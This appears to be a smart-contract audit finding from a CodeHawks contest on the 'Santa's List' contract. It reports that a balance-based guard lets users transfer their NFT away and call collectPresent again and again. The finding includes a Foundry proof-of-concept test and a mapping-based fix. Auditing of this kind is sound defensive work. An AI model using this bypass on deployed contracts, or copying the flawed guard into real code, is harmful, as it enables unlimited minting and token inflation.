## Santa's List
[https://codehawks.cyfrin.io/c/ai-santas-list-clk83mi5b0004jp08axr82nq1/s/3]

100
EXP

Dec 22nd, 2025 → Dec 22nd, 2025

## Submission Details
Severity: **High**

## Balance-Based Collection Guard Fails on NFT Transfer

firmanregar

## Root + Impact Description
The `collectPresent` function prevents duplicate collection by checking `balanceOf(msg.sender) > 0`. Since ERC721 tokens are transferable, users can transfer their NFT to another address and immediately collect again, repeating indefinitely.

In `SantasList.sol`, The guard relies on a mutable property (token balance) to enforce an immutable requirement (one collection per address).
```solidity
function collectPresent() external {
    if (block.timestamp < CHRISTMAS_2023_BLOCK_TIME) {
        revert SantasList__NotChristmasYet();
    }
    if (balanceOf(msg.sender) > 0) {
        revert SantasList__AlreadyCollected();
    }
    // ... mint logic
}
```

## Risk
**Likelihood:**
High.

**Impact:**
Users can mint unlimited NFTs by:
1. Calling `collectPresent` to receive NFT #1
2. Transferring NFT #1 to any address (including their own alternate wallet)
3. Calling `collectPresent` again to receive NFT #2
4. Repeating indefinitely

For `EXTRA_NICE` users, this also generates unlimited SantaToken mints, inflating the token supply without bound.

## Proof of Concept
```solidity
if (balanceOf(msg.sender) > 0) revert AlreadyCollected();
```

ERC721 balances are mutable via transfers.
```solidity
function testTransferBypassAllowsReCollection() public {
    vm.startPrank(santa);
    santasList.checkList(user, SantasList.Status.EXTRA_NICE);
    santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
    vm.stopPrank();
    
    vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);
    
    vm.startPrank(user);
    
    // First collection
    santasList.collectPresent();
    assertEq(santasList.balanceOf(user), 1);
    assertEq(santaToken.balanceOf(user), 1e18);
    
    // Transfer NFT away
    santasList.transferFrom(user, address(0xdead), 0);
    
    // Second collection works
    santasList.collectPresent();
    assertEq(santasList.balanceOf(user), 1);
    assertEq(santaToken.balanceOf(user), 2e18);
    
    vm.stopPrank();
}
```

## Recommended Mitigation
Track collection with a dedicated `hasCollected[address]` mapping.
Alternatively, replace the balance check with a dedicated collection tracker:
```solidity
mapping(address => bool) private s_hasCollected;
​
function collectPresent() external {
    if (s_hasCollected[msg.sender]) {
        revert SantasList__AlreadyCollected();
    }
    s_hasCollected[msg.sender] = true;
    // ... rest of logic
}
```
